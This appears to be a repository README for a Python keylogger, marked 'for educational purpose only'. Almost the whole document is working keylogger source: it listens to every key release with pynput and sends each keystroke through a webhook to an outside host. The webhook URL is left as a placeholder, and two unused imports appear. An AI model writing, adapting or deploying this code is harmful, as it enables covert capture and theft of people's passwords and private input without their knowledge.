# keylogger_PY


FOR EDUCATIONAL PURPOSE ONLY 


```
from os import CLD_DUMPED
from types import ClassMethodDescriptorType
from pynput import keyboard
from dhooks import Webhook

hook = Webhook("webhookurl")


def on_release(key):
    hook.send(str(key))
    print('sent')

with keyboard.Listener(on_release=on_release) as listener:
    listener.join()

```
